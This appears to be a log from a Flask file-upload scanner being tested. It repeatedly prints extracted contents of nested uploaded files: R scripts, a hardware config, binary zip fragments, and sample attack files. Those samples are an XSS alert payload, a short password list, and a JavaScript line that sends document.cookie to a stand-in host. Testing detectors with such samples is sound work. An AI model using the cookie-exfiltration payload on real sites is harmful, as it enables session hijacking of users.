plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:59:14,074 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:59:14,075 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:59:14,076 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,077 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,079 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,080 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:59:14,082 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,083 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,084 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:59:14,086 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:59:14,087 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:59:14,088 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:59:14,089 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,090 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,091 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,092 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:59:14,094 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,095 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,096 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,097 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,098 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,099 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:14,100 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,101 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,102 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,103 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,104 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,105 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:14,106 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,107 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,108 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,109 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,110 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,111 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:14,113 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,114 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,115 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,116 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,117 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,118 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:14,119 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,120 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,121 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,122 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,125 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:59:14,125 - [33mPress CTRL+C to quit[0m
2025-02-22 20:59:19,351 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 20:59:19,355 - 127.0.0.1 - - [22/Feb/2025 20:59:19] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:59:19,369 - 127.0.0.1 - - [22/Feb/2025 20:59:19] "GET / HTTP/1.1" 200 -
2025-02-22 20:59:27,603 - Extracted content from uploads/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:27,608 - 127.0.0.1 - - [22/Feb/2025 20:59:27] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:59:27,615 - 127.0.0.1 - - [22/Feb/2025 20:59:27] "GET / HTTP/1.1" 200 -
2025-02-22 21:01:53,542 - Extracted content from uploads/flask_file_upload_2.zip: PK     șVZ               flask_file_upload/UT
 ԹgԹgԹgux     PK   VZ        /  *   flask_file_upload/create_malicious_xlsx.pyUT
 qԹgԹgԹgux     }RJ0}W\CZA|P0]Ň
e|YzaiRtI[MyJ=prɵ*@(]#ޔެA90⪠3*ji6 w.ࡅ{ƇJ~hen|"j^'YžXnF8 SjiTLI#ʫۖ?2p	9TtwI'4+$wh._ur?椉[*"b>XdeHNǠ?W̰PVjgiWڎz;s2jYILXTQRjm95<m
*TIV:
Ӽt2	#XS7'Z-DOVKͥ#1 xQd+!vIQ<3,û8PK  /  PK   VZ        '  &   flask_file_upload/metadata_analysis.pyUT
 z¹g¹gz¹gux     UQO0~ϯ8
2025-02-22 21:01:54,298 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:01:54,300 - Extracted content from uploads/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,301 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:01:54,302 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:01:54,303 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:01:54,305 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:01:54,306 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,307 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,307 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,308 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:01:54,310 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,312 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,313 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:01:54,314 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:01:54,315 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:01:54,317 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:01:54,318 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,319 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,320 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,321 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:01:54,323 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,324 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,325 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:01:54,326 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:01:54,327 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:01:54,329 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:01:54,330 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,331 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,332 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,333 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:01:54,335 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,336 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:01:54,337 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:01:54,338 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:01:54,339 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:01:54,340 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:01:54,340 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,341 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:01:54,342 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

